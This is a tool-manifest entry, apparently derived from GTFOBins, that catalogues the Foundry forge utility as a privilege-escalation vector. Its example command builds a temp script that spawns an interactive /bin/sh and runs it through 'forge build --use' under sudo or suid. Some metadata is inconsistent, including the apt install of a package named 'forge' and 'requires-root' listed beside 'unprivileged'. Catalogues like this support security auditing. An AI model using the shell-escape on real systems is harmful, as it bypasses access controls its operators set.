---
id: dev-foundry-forge
namespace: dev:foundry:forge
name: forge
description: Foundry framework for Ethereum smart contract development; can spawn
  a shell via build scripts.
author: GTFOBins
version: 1.0.0
capabilities:
- security.privilege-escalation.shell
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- forge
parameters: []
features:
- interactive
- process-manip
- requires-root
execution:
  template: forge
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Spawn an interactive shell (sudo, suid, unprivileged)
  command: 'echo ''#!/bin/sh'' >/path/to/temp-file

    echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file

    chmod +x /path/to/temp-file

    forge build --use /path/to/temp-file'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/forge/
techniques:
- privilege-escalation
- execution
install:
- method: apt
  package_name: forge
  commands:
  - apt-get install -y forge
---

# forge

forge is a command-line utility. Foundry smart contract development framework; can also spawn an interactive shell.
